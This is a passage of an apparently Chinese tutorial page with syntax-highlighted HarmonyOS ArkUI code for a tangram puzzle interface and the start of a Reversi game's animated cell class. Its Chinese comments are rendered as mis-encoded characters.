function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">rotationAngle</span> -= <span class="number">5</span>; <span class="comment">// å‡å°‘æ—‹è½¬è§’åº¦</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ—‹è½¬è§’åº¦è®¡æ•°å™¨</span></span><br><span class="line">      <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">5</span> &#125;) &#123; <span class="comment">// åˆ›å»ºå‚ç›´å¸ƒå±€ï¼Œè®¾ç½®é—´è·</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`æ—‹è½¬è§’åº¦(é—´éš”45)`</span>).<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>) <span class="comment">// æ˜¾ç¤ºæ—‹è½¬è§’åº¦æ–‡æœ¬ï¼Œè®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">        <span class="title class_">Counter</span>() &#123; <span class="comment">// åˆ›å»ºè®¡æ•°å™¨ç»„ä»¶</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.selectedBlockIndex != -<span class="number">1</span> ? <span class="variable language_">this</span>.blocks[<span class="variable language_">this</span>.selectedBlockIndex].rotationAngle :</span></span></span><br><span class="line"><span class="subst"><span class="string">            <span class="string">&#x27;-&#x27;</span>&#125;</span>`</span>)<span class="comment">// æ˜¾ç¤ºå½“å‰é€‰ä¸­ä¸ƒå·§æ¿çš„æ—‹è½¬è§’åº¦æˆ–å ä½ç¬¦</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">width</span>(<span class="number">300</span>) <span class="comment">// è®¾ç½®è®¡æ•°å™¨å®½åº¦</span></span><br><span class="line">        .<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å¢åŠ æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">rotationAngle</span> += <span class="number">45</span>; <span class="comment">// å¢åŠ æ—‹è½¬è§’åº¦</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å‡å°‘æŒ‰é’®çš„ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">rotationAngle</span> -= <span class="number">45</span>; <span class="comment">// å‡å°‘æ—‹è½¬è§’åº¦</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// ç¿»è½¬æŒ‰é’®</span></span><br><span class="line">      <span class="title class_">Row</span>() &#123; <span class="comment">// åˆ›å»ºæ°´å¹³å¸ƒå±€</span></span><br><span class="line">        <span class="title class_">Button</span>(<span class="string">&#x27;å‘å·¦ç¿»è½¬&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å·¦ç¿»è½¬æŒ‰é’®ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">          <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">flipAngle</span> -= <span class="number">180</span>; <span class="comment">// å‡å°‘ç¿»è½¬è§’åº¦</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Button</span>(<span class="string">&#x27;å‘å³ç¿»è½¬&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å³ç¿»è½¬æŒ‰é’®ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">          <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> != -<span class="number">1</span>) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[<span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span>].<span class="property">flipAngle</span> += <span class="number">180</span>; <span class="comment">// å¢åŠ ç¿»è½¬è§’åº¦</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceEvenly</span>) <span class="comment">// è®¾ç½®å®½åº¦å’Œå†…å®¹å¯¹é½æ–¹å¼</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// é‡ç½®å’Œéšè—è¾¹æ¡†æŒ‰é’®</span></span><br><span class="line">      <span class="title class_">Row</span>() &#123; <span class="comment">// åˆ›å»ºæ°´å¹³å¸ƒå±€</span></span><br><span class="line">        <span class="title class_">Button</span>(<span class="string">&#x27;é‡ç½®&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// é‡ç½®æŒ‰é’®ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">          <span class="title function_">animateTo</span>(&#123;&#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">blocks</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">blocks</span>[i].<span class="title function_">resetData</span>(); <span class="comment">// é‡ç½®ä¸ƒå·§æ¿æ•°æ®</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> = -<span class="number">1</span>; <span class="comment">// é‡ç½®é€‰ä¸­ç´¢å¼•</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="title class_">Button</span>(<span class="string">&#x27;éšè—è¾¹æ¡†&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// éšè—è¾¹æ¡†æŒ‰é’®ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">selectedBlockIndex</span> = -<span class="number">1</span>; <span class="comment">// é‡ç½®é€‰ä¸­ç´¢å¼•</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">SpaceEvenly</span>) <span class="comment">// è®¾ç½®å®½åº¦å’Œå†…å®¹å¯¹é½</span></span><br><span class="line">    &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Reversi"><a href="#Reversi" class="headerlink" title="Reversi"></a>Reversi</h1><p>ç¿»è½¬æ£‹ï¼ˆReversiï¼‰ã€å¥¥èµ›ç½—æ£‹ï¼ˆOthelloï¼‰ã€è‹¹æœæ£‹æˆ–æ­£åæ£‹ï¼ˆAnti reversiï¼‰ é»‘ç™½æ£‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; promptAction &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>; <span class="comment">// å¯¼å…¥ç”¨äºå¼¹å‡ºå¯¹è¯æ¡†çš„å·¥å…·</span></span><br><span class="line"> </span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChessCell</span> &#123; <span class="comment">// å®šä¹‰æ£‹ç›˜ä¸Šçš„å•å…ƒæ ¼ç±»</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">frontVisibility</span>: number = <span class="number">0</span>; <span class="comment">// å•å…ƒæ ¼ä¸Šçš„æ£‹å­çŠ¶æ€ï¼š0è¡¨ç¤ºæ— å­, 1è¡¨ç¤ºé»‘å­ï¼Œ2è¡¨ç¤ºç™½å­</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">rotationAngle</span>: number = <span class="number">0</span>; <span class="comment">// å•å…ƒæ ¼å¡ç‰‡çš„æ—‹è½¬è§’åº¦</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">opacity</span>: number = <span class="number">1</span>; <span class="comment">// é€æ˜åº¦</span></span><br><span class="line">  <span class="attr">isAnimationRunning</span>: boolean = <span class="literal">false</span>; <span class="comment">// æ ‡è®°åŠ¨ç”»æ˜¯å¦æ­£åœ¨è¿è¡Œ</span></span><br><span class="line"> </span><br><span class="line">  <span class="title function_">flip</span>(<span class="params">time: number</span>) &#123; <span class="comment">// ç¿»è½¬æ£‹å­çš„æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">frontVisibility</span> === <span class="number">1</span>) &#123; <span class="comment">// å½“å‰æ˜¯é»‘å­ï¼Œè¦ç¿»è½¬æˆç™½å­</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">showWhite</span>(time);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">frontVisibility</span> === <span class="number">2</span>) &#123; <span class="comment">// å½“å‰æ˜¯ç™½å­ï¼Œè¦ç¿»è½¬æˆé»‘å­</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">showBlack</span>(time);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">showBlack</span>(<span class="params">animationTime: number, callback?: () =&gt; <span class="keyword">void</span></span>) &#123; <span class="comment">// å±•ç¤ºé»‘è‰²æ£‹å­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123; <span class="comment">// å¦‚æœå·²ç»æœ‰åŠ¨ç”»åœ¨è¿è¡Œï¼Œåˆ™è¿”å›</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºè¿è¡Œä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (animationTime == <span class="number">0</span>) &#123; <span class="comment">// å¦‚æœä¸éœ€è¦åŠ¨ç”»</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">0</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º0</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">1</span>; <span class="comment">// é»‘å­</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢</span></span><br><span class="line">      <span class="keyword">if</span> (callback) &#123; <span class="comment">// å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="comment">// å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">      <span class="attr">duration</span>: animationTime, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´</span></span><br><span class="line">      <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// åŠ¨ç”»è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">      <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// åŠ¨ç”»æ›²çº¿ç±»å‹</span></span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">          <span class="comment">// å†æ¬¡å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">          <span class="attr">duration</span>: animationTime, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´</span></span><br><span class="line">          <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// åŠ¨ç”»è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">          <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// åŠ¨ç”»æ›²çº¿ç±»å‹</span></span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢</span></span><br><span class="line">            <span class="keyword">if</span> (callback) &#123; <span class="comment">// å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ</span></span><br><span class="line">              <span class="title function_">callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">1</span>; <span class="comment">// çœ‹åˆ°é»‘è‰²</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">0</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º0</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">90</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º90åº¦</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">showWhite</span>(<span class="params">animationTime: number, callback?: () =&gt; <span class="keyword">void</span></span>) &#123; <span class="comment">// å±•ç¤ºç™½è‰²æ£‹å­</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123; <span class="comment">// å¦‚æœå·²ç»æœ‰åŠ¨ç”»åœ¨è¿è¡Œï¼Œåˆ™è¿”å›</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºè¿è¡Œä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (animationTime == <span class="number">0</span>) &#123; <span class="comment">// å¦‚æœä¸éœ€è¦åŠ¨ç”»</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">frontVisibility</span> = <span class="number">2</span>; <span class="comment">// ç™½å­</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢</span></span><br><span class="line">      <span class="keyword">if</span> (callback) &#123; <span class="comment">// å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="comment">// å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">      <span class="attr">duration</span>: animationTime, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´</span></span><br><span class="line">      <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// åŠ¨ç”»è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">      <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// åŠ¨ç”»æ›²çº¿ç±»å‹</span></span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">          <span class="comment">// å†æ¬¡å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">          <span class="attr">duration</span>: animationTime, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´</span></span><br><span class="line">          <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// åŠ¨ç”»è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">          <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span 